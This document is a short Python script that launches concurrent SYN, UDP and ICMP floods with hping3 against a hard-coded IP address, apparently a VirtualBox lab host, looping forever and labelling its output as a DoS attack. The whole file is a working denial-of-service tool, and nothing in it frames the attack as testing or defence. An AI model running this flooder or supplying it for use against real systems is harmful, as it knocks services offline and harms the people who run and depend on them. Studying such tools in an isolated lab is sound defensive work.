#!/usr/bin/env python3
import subprocess
import threading
import time
import random

TARGET = "192.168.56.105"

def syn_flood():
    while True:
        cmd = [
            "hping3", TARGET,
            "-S",            # SYN packets
            "-p", "80",      # HTTP port
            "--flood"        # send as fast as possible
        ]
        print(f"[DoS] SYN Flood: {' '.join(cmd)}")
        subprocess.run(cmd)

def udp_flood():
    while True:
        cmd = [
            "hping3", TARGET,
            "--udp",
            "-p", "53",
            "--flood"
        ]
        print(f"[DoS] UDP Flood: {' '.join(cmd)}")
        subprocess.run(cmd)

def icmp_flood():
    while True:
        cmd = [
            "hping3", TARGET,
            "--icmp",
            "--flood"
        ]
        print(f"[DoS] ICMP Flood: {' '.join(cmd)}")
        subprocess.run(cmd)

if __name__ == "__main__":
    try:
        threads = []
        for attack_func in [syn_flood, udp_flood, icmp_flood]:
            t = threading.Thread(target=attack_func, daemon=True)
            t.start()
            threads.append(t)

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("[*] DoS attack stopped.")
